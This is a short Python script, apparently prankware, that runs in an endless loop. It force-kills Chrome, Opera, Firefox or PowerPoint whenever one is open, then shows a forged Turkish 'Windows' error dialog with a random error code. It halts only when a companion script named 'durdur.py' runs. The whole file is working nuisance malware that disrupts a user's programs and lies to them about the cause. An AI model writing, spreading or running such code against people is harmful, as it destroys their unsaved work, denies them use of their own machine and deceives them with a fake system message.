import subprocess
import time
import psutil
import os
import random
import tkinter

from tkinter import messagebox

def stop(script):
    for q in psutil.process_iter():
        if q.name().startswith('python'):
            if len(q.cmdline())>1 and script in q.cmdline()[1] and q.pid !=os.getpid():
                return True

    return False

def checkWindow():
    if "chrome.exe" in (i.name() for i in psutil.process_iter()):
        return "chrome.exe"
    if "opera.exe" in (i.name() for i in psutil.process_iter()):
        return "opera.exe"
    if "firefox.exe" in (i.name() for i in psutil.process_iter()):
        return "firefox.exe"
    if "POWERPNT.EXE" in (i.name() for i in psutil.process_iter()):
        return "powerpoint.exe"
    
def killWindow(window):
    if window != None:
        subprocess.call(f"TASKKILL /F /IM {window}", shell=True)
        errormessage = f"Windows {window} adlı uygulamayı çalıştırırken bir sorun ile karşılaştı. Lütfen daha sonra tekrar deneyiniz.\nHata Kodu: {str(random.randrange(10)) + str(random.randrange(10))}31"
        tkinter.messagebox.showerror(title="Windows", message=errormessage)

while True:
    killWindow(checkWindow())
    print(stop("durdur.py"))
    if stop("durdur.py"):
        quit()
